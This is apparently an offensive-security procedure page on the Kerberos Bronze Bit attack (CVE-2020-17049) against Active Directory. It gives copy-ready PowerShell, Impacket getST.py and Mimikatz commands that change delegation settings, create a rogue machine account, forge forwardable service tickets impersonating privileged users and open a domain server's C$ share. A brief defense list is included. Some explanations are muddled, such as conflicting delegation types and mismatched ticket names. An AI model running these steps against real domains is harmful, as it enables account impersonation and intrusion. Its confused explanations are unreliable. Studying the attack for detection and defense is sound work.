---
type: procedure
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
sub_techniques:
  - '[[sub-techniques/Pass the Ticket|T1558.002 - Pass the Ticket]]'
  - '[[sub-techniques/Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Kerberos]]'
  - '[[tags/Delegation Abuse]]'
  - '[[tags/CVE-2020-17049]]'
commands:
  - '[[commands/powershell-set-aduser-trusted-for-delegation]]'
  - '[[commands/powershell-set-aduser-service-principal-names]]'
  - '[[commands/powershell-set-aduser-kerberos-encryption-type]]'
  - '[[commands/python-getst-py-request-forwardable-ticket]]'
  - '[[commands/powershell-create-machine-account-powermad]]'
  - '[[commands/powershell-mimikatz-generate-kerberos-hash]]'
  - '[[commands/powershell-set-adcomputer-principals-allowed-to-delegate]]'
  - '[[commands/python-getst-py-bronze-bit-execution]]'
  - '[[commands/mimikatz-load-kerberos-ticket]]'
  - '[[commands/powershell-access-remote-admin-share]]'
tools:
  - '[[tools/Powermad]]'
  - '[[tools/Mimikatz]]'
  - '[[tools/Impacket]]'
platforms:
  - Windows
skill_level: advanced
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Kerberos-Bronze-Bit-Attack

## Summary

The Kerberos Bronze Bit Attack (CVE-2020-17049) exploits a vulnerability in Windows Active Directory's handling of Kerberos delegation and forwardable tickets. An attacker with a valid domain user account can abuse unconstrained delegation settings, create a machine account, and forge service tickets to impersonate users and access restricted resources like administrative shares, bypassing authentication controls such as MFA.

## Description

This procedure details how to perform the Bronze Bit attack, which leverages the msDS-AllowedToDelegateTo attribute and forwardable ticket flags to forge Kerberos tickets. The attack requires domain access and involves configuring delegation on a user or machine account, requesting forwardable tickets using Impacket's getST.py, and loading them with Mimikatz for lateral movement. It targets Active Directory environments where delegation is misconfigured, allowing ticket forging without domain admin privileges. Successful execution grants access to sensitive domain resources, such as C$ shares on domain controllers or servers.

## Requirements

1. Valid domain user account with permissions to modify AD objects (e.g., write access to user/computer attributes).
2. Network access to the domain controller (ports 88/TCP for Kerberos, 445/TCP for SMB).
3. Installed tools: PowerShell Active Directory module, Powermad, Mimikatz, Impacket.
4. Knowledge of target domain details (e.g., SPNs, user hashes, DC IP).

## Defense

- Implement resource-based constrained delegation (RBCD) instead of unconstrained delegation to limit ticket forwarding.
- Monitor AD changes to delegation attributes (e.g., msDS-AllowedToDelegateTo) via auditing.
- Enable Kerberos event logging (Event ID 4769 for ticket requests) and detect anomalous forwardable ticket requests.
- Use least privilege: Restrict write access to AD objects and enforce protected users group to block delegation.
- Regularly audit machine accounts and remove unused delegation trusts.

## Objectives

1. Forge Kerberos service tickets to impersonate domain users and access restricted services.
2. Bypass authentication mechanisms like MFA by abusing delegation trusts.
3. Achieve lateral movement to sensitive resources, such as administrative shares on remote servers.

## Instructions

### Step 1: Configure User Account for Delegation

**Context**: Prepare a domain user account for delegation by enabling trust for delegation, specifying target services via SPNs, and setting Kerberos encryption types. This step abuses AD delegation settings to allow ticket forwarding.

**Command** ([[commands/powershell-set-aduser-trusted-for-delegation]]):
```powershell
Set-ADUser -Identity 'User1' -TrustedForDelegation $true
```

> This enables unconstrained delegation on the user account, allowing it to forward tickets to any service. Expected output: No errors; verify with Get-ADUser -Identity 'User1' -Properties TrustedForDelegation.

**Command** ([[commands/powershell-set-aduser-service-principal-names]]):
```powershell
Set-ADUser -Identity 'User1' -ServicePrincipalNames 'cifs/Service2.test.local', 'host/Service2.test.local'
```

> Adds SPNs to the user account for the target services (e.g., CIFS for file shares). Expected output: SPNs updated; confirm with Get-ADUser -Identity 'User1' -Properties ServicePrincipalNames.

**Command** ([[commands/powershell-set-aduser-kerberos-encryption-type]]):
```powershell
Set-ADUser -Identity 'User1' -KerberosEncryptionType 'RC4-HMAC-NT', 'AES128-CTS-HMAC-SHA1-96'
```

> Configures supported Kerberos encryption types to match domain defaults, ensuring compatibility for ticket requests. Expected output: Encryption types set; no errors on verification.

### Step 2: Request Forwardable Service Ticket

**Context**: Use Impacket to request a forwardable Kerberos service ticket (TGS) for a target SPN, impersonating a user with known credentials. The -force-forwardable flag exploits weak protection on the forwardable bit.

**Command** ([[commands/python-getst-py-request-forwardable-ticket]]):
```python
getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1$ -force-forwardable -dc-ip <DC_IP>
```

> Requests a TGS ticket saved as User2.ccache. Expected output: Ticket file generated (e.g., Administrator.ccache); verify with klist or Mimikatz.

### Step 3: Create Machine Account for Abuse

**Context**: Create a rogue machine account using Powermad to serve as a delegation target, then generate its Kerberos hash for authentication.

**Command** ([[commands/powershell-create-machine-account-powermad]]):
```powershell
Import-Module .\Powermad\powermad.ps1; New-MachineAccount -MachineAccount AttackerService -Password (ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
```

> Creates the machine account AttackerService$. Expected output: Account added to AD; verify with Get-ADComputer AttackerService.

**Command** ([[commands/powershell-mimikatz-generate-kerberos-hash]]):
```powershell
.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
```

> Generates NTLM and AES hashes for the machine account. Expected output: Hashes displayed (e.g., aad3b435b51404eeaad3b435b51404ee:830f8df592f48bc036ac79a2bb8036c5).

### Step 4: Set Principals Allowed to Delegate

**Context**: Modify the target computer's AD object to allow the rogue machine account to delegate to it, enabling ticket forging.

**Command** ([[commands/powershell-set-adcomputer-principals-allowed-to-delegate]]):
```powershell
Install-WindowsFeature RSAT-AD-PowerShell; Import-Module ActiveDirectory; Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
```

> Sets the delegation attribute on Service2 to trust AttackerService. Expected output: Attribute updated; verify with Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount.

### Step 5: Execute Bronze Bit Ticket Forging

**Context**: Use the rogue machine account to request a forged forwardable ticket for the target service, impersonating a privileged user.

**Command** ([[commands/python-getst-py-bronze-bit-execution]]):
```python
python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService$ -force-forwardable -dc-ip <DC_IP>
```

> Forges the TGS ticket using delegation abuse. Expected output: User2.ccache generated with forwardable flag set.

### Step 6: Load Ticket and Access Resources

**Context**: Load the forged ticket into memory and use it to access remote resources, demonstrating successful impersonation.

**Command** ([[commands/mimikatz-load-kerberos-ticket]]):
```powershell
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit
```

> Imports the ticket for current session. Expected output: Ticket loaded; verify with kerberos::list.

**Command** ([[commands/powershell-access-remote-admin-share]]):
```powershell
Get-ChildItem \\service2.test.local\c$
```

> Accesses the C$ admin share using the impersonated ticket. Expected output: Directory listing of C$ contents, confirming access.
